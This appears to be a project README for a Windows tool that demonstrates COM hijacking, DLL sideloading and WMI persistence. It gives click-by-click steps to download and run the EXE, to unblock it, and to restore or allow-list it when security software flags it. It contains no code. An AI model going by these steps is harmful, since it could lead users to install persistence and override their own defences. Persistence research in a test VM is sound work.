# 🧩 3LayersPersistence - Run layered persistence demos easily

[![Download Now](https://img.shields.io/badge/Download-3LayersPersistence-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/BielGodoi/3LayersPersistence)

## 🚀 What this is

3LayersPersistence is a Windows app that shows how one EXE can turn into proxy DLL files at runtime.

It is built to help you test and observe three persistence layers from one place. The app focuses on common Windows methods tied to COM, DLL loading, and WMI.

Use it if you want to see how these techniques work in a simple end-user package.

## 📥 Download

Visit this page to download and run the app:

https://github.com/BielGodoi/3LayersPersistence

Open the page, look for the latest release or main download option, and save the file to your PC.

## 🖥️ What you need

- Windows 10 or Windows 11
- Local admin rights for full testing
- 64-bit system
- Microsoft Defender or another security tool may flag the file because of the way it works
- A test machine or VM is best for safe use

## 🧰 What the app does

- Starts as a single EXE
- Writes proxy DLL files at runtime
- Uses layered persistence methods
- Helps you inspect how Windows handles those layers
- Works from one folder with no complex setup

## 📁 Before you start

Create a new folder for the files you download.

Keep the app in a place you can find again, such as:

- Downloads
- Desktop
- A test folder like `C:\Test\3LayersPersistence`

If Windows shows a prompt about the file, check the publisher and path before you continue.

## ⚙️ How to run it

1. Open the download page:
   https://github.com/BielGodoi/3LayersPersistence

2. Download the latest Windows build or EXE from the page

3. Save the file to your computer

4. If the file comes in a ZIP, right-click it and choose Extract All

5. Open the folder that holds the EXE

6. Double-click the EXE to start it

7. If Windows asks for approval, choose Run or Yes

8. Let the app finish its first start so it can create the proxy DLL files it needs

## 🔍 What you should see

When the app runs, it should:

- Create files in its working folder
- Set up the three persistence layers
- Use Windows paths and loading behavior tied to the demo
- Leave clear file changes you can inspect after launch

If you do not see the files, run the app again from the same folder and check that it has permission to write there.

## 🧭 Folder layout

A typical setup may look like this:

- `3LayersPersistence.exe` - main app
- `proxy1.dll` - first layer file
- `proxy2.dll` - second layer file
- `proxy3.dll` - third layer file
- logs or support files created at runtime

Keep the full folder together. The app may need its files in the same place to work as expected.

## 🪟 Running with fewer issues

If Windows blocks the file:

1. Right-click the EXE
2. Open Properties
3. If you see an Unblock box, check it
4. Click Apply
5. Run the app again

If the file still does not start, move the folder to a simple path like `C:\Temp\3LayersPersistence` and try again.

## 🧪 Good ways to use it

- Test in a virtual machine
- Use a spare Windows PC
- Watch file creation in the folder
- Review startup behavior after the first run
- Compare results before and after closing the app

This makes it easier to see how the three layers work without changing your main system.

## 🛠️ Common problems

### The file does not open

- Make sure you downloaded the EXE from the GitHub page
- Check that the file is not still inside a ZIP
- Move it to a local folder and run it again

### Windows removed or blocked the file

- Security tools may treat the app as suspicious because of how it works
- Restore the file if you trust the source
- Add the folder to an allowed path in your test setup

### The proxy DLL files do not appear

- Run the EXE from the same folder where it was first started
- Check that the folder is writable
- Try again with admin rights

### The app closes right away

- Open it from Command Prompt to see any messages
- Make sure you did not rename or move support files
- Re-download the release if files seem broken

## 📌 Basic behavior

The app is built around three layers:

- COM-based loading
- DLL sideloading style behavior
- WMI-based persistence

It shows how one program can set up each layer from a single launch path.

## 🔐 Safe use

Use the app only on systems you own or have permission to test.

A virtual machine works well if you want to keep your main Windows install separate from the demo files.

## 🗂️ File handling tips

- Keep the EXE and DLL files in one folder
- Do not rename the files unless the project page tells you to
- Do not move only part of the folder
- Save a copy of the original download before you test

## 📎 Project link

Primary download page:

https://github.com/BielGodoi/3LayersPersistence

## 🧩 Topics

COM hijacking, DLL sideloading, persistence, WMI

## 🪟 Windows setup checklist

- You have a Windows 10 or 11 PC
- You downloaded the file from the GitHub page
- You extracted the ZIP, if one was provided
- You kept all files in one folder
- You ran the EXE from that folder
- You checked that the folder allows file writes